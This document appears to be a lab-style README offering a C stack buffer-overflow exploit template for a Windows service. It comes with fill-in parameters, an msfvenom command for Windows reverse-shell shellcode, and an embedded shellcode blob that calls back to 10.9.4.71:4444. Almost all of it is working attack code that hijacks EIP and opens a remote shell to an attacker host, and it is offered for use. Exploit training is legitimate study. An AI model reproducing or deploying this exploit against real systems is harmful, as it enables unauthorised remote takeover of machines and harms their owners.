# Reverse Shell in C 
This C exploit redirects the EIP to a JMP instruction, then provides shellcode to generate a reverse shell to `10.9.4.71:4444`.

**Parameters to change**
 - `TARGET_IP` - Target IP Address
 - `TARGET_PORT` - Target Port
 - `EIP_LOCATION` - Index of the EIP
 - `ESP JMP ADDRESS` - The address of a JMP instruction, in [Little Endian](https://www.techtarget.com/searchnetworking/definition/big-endian-and-little-endian).
 - `SHELLCODE` 
	 - To generate a basic reverse shell for windows
	 - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.205 LPORT=4444 EXITFUNC=thread -b  -f  c`

```
#include "stdlib.h"
#include "stdio.h"
#include "string.h"
#include <unistd.h>
#include "arpa/inet.h"
#include "sys/socket.h"

#define TARGET "TARGET_IP"
#define PORT TARGET_PORT

int main(int argc, const char *argv[])
{
	const int EIP_SIZE = 4;
	const int OFFSET_SIZE = *EIP_LOCATION*;
	const int SHELL_CODE_SIZE = 402;
	const int PADDING_SIZE = 16;
	
	const int TOTAL_SIZE = OFFSET_SIZE + EIP_SIZE + PADDING_SIZE + SHELL_CODE_SIZE;
	
	int sockfd;
	struct sockaddr_in address;

	char *buffer = malloc(sizeof(char) * TOTAL_SIZE); // overall payload to be sent
	char *offset = malloc(sizeof(char) * OFFSET_SIZE); // our overflow/offset based on the previous exercise.
	char *new_eip = "*ESP JMP LOCATION IN LITTLE ENDIAN*"; // replacement value for our EIP
	char *padding = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	
	char shell_code[] =
	"\xd9\xc4\xbf\x30\x11\x64\xdd\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
	"\x5e\x31\x7d\x1a\x03\x7d\x1a\x83\xc5\x04\xe2\xc5\xed\x8c\x52"
	"\x25\x0e\x4d\x0d\xac\xeb\x7c\x1f\xca\x78\x2c\xaf\x99\x2d\xdd"
	"\x44\xcf\xc5\xd2\xed\xa5\xc3\xdd\xee\xb2\x7e\x36\x20\x04\xd2"
	"\x7a\x23\xf8\x29\xaf\x83\xc1\xe1\xa2\xc2\x06\xb4\xc9\x2b\xda"
	"\x10\xb9\xe6\xca\x15\xff\x3a\xeb\xf9\x8b\x03\x93\x7c\x4b\xf7"
	"\x2f\x7e\x9c\xa8\x24\xc8\x04\xc2\x62\xe9\x35\x07\x17\x20\x41"
	"\x9b\x26\x4c\xe3\x68\x7c\x39\xf5\xb8\x4d\xfd\x5a\x85\x62\xf0"
	"\xa3\xc1\x44\xeb\xd1\x39\xb7\x96\xe1\xf9\xca\x4c\x67\x1e\x6c"
	"\x06\xdf\xfa\x8d\xcb\x86\x89\x81\xa0\xcd\xd6\x85\x37\x01\x6d"
	"\xb1\xbc\xa4\xa2\x30\x86\x82\x66\x19\x5c\xaa\x3f\xc7\x33\xd3"
	"\x20\xaf\xec\x71\x2a\x5d\xfa\x06\xd3\x9e\x03\x5b\x44\x53\xce"
	"\x64\x94\xfb\x59\x16\xa6\xa4\xf1\xb0\x8a\x2d\xdc\x47\x9a\x39"
	"\xdf\x98\x24\x29\x21\x19\x55\x60\xe6\x4d\x05\x1a\xcf\xed\xce"
	"\xda\xf0\x3b\x7a\xd0\x66\xce\x72\xe0\x31\xa6\x86\xe8\xac\x6a"
	"\x0e\x0e\x9e\xc2\x40\x9e\x5f\xb3\x20\x4e\x08\xd9\xae\xb1\x28"
	"\xe2\x64\xda\xc3\x0d\xd1\xb3\x7b\xb7\x78\x4f\x1d\x38\x57\x2a"
	"\x1d\xb2\x52\xcb\xd0\x33\x16\xdf\x05\x24\xd8\x1f\xd6\xc1\xd8"
	"\x75\xd2\x43\x8e\xe1\xd8\xb2\xf8\xae\x23\x91\x7a\xa8\xdc\x64"
	"\x4b\xc3\xeb\xf2\xf3\xbb\x13\x13\xf4\x3b\x42\x79\xf4\x53\x32"
	"\xd9\xa7\x46\x3d\xf4\xdb\xdb\xa8\xf7\x8d\x88\x7b\x90\x33\xf7"
	"\x4c\x3f\xcb\xd2\xce\x38\x33\xa1\xf8\xe0\x5c\x59\xb9\x10\x9d"
	"\x33\x39\x41\xf5\xc8\x16\x6e\x35\x31\xbd\x27\x5d\xb8\x50\x85"
	"\xfc\xbd\x78\x4b\xa1\xbe\x8f\x50\x52\xc5\xe0\x67\x93\x3a\xe9"
	"\x03\x93\x3b\x15\x32\xaf\xea\x2c\x40\xee\x2f\x0b\x4b\xed\x85"
	"\x66\xe4\xa8\x4c\xcb\x69\x4b\xbb\x08\x94\xc8\x49\xf1\x63\xd0"
	"\x38\xf4\x28\x56\xd1\x84\x21\x33\xd5\x3b\x41\x16"; // 10.9.4.71:4444
	
	memset(offset, 'A', OFFSET_SIZE);
	
	strcat(buffer, offset);
	strcat(buffer, new_eip);
	strcat(buffer, padding);
	strcat(buffer, shell_code);
	
	printf("Sending Payload\n");
	printf("%s\n", buffer);
	printf("-------------------------------------------------");
	
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
	{
		perror("Socket creation failed");
		exit(EXIT_FAILURE);
	}
	
	address.sin_port = htons(PORT);
	address.sin_family = AF_INET;
	  
	if ((inet_pton(AF_INET, TARGET, &address.sin_addr)) <= 0)
	{
		perror("Cannot convert IP address correctly!");
		exit(EXIT_FAILURE);
	}
	
	if ((connect(sockfd, (struct sockaddr *)&address, sizeof(address))) < 0)
	{
		perror("Connection failed!");
		exit(EXIT_FAILURE);
	}
	
	send(sockfd, buffer, TOTAL_SIZE, 0);
	
	return 0;
}
```